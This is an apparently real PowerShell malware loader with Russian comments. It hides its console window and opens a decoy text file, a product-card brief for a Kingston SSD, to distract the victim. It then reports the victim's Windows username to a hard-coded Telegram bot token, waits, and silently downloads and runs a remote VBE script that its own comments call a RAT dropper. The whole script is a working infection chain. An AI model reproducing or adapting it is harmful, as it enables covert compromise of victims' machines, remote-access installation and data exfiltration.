# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "TZKingston XS2000 BOC 2000 ГБ .txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Краткое описание проекта
Разработать 2 карточки товара для размещения на маркетплейсах (Ozon, Wildberries): Kingston XS2000 BOC 2000 ГБ (SXS2000/2000GA), 2 ТБ, серебристый. Стиль — профессиональный, акцент на надёжности и портативности.

карточка 1 - Фото 1: главный ракурс диска на нейтральном фоне; Фото 2: вид порта/интерфейса; Фото 3: боковой ракурс; текст: заголовок с акцентом «2000 МБ/с», краткие буллеты и таблица спецификаций.

карточка 2 - Фото 1: миниатюра продукта на белом фоне; Фото 2: крупный вид для галереи; Фото 3: изображение для каталога (малый размер); текст: короткий заголовок, 3‑строчное описание, раскрывающаяся техническая таблица.

Материалы для работы находятся в папке.

Характеристики
Тип: Внешний SSD-диск
Интерфейс диска: USB 3.2
Тип флеш-памяти: 3D NAND
Объем: 2 ТБ
Материал корпуса: Металл, Пластик
Страна-изготовитель: Китай (Тайвань)
Бренд: Kingston
Цвет: Серебристый
Вид накопителя: Портативный
Тип накопителя: SSD
Скорость чтения, Мб/с: 2000
Скорость записи, Мб/с: 2000
Расположение жесткого диска: Внешний
Ударопрочный корпус: Да
Размеры, мм: 69.54х32.58х13.5
Вес товара, г: 28.9
Гарантийный срок: 60 месяце
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit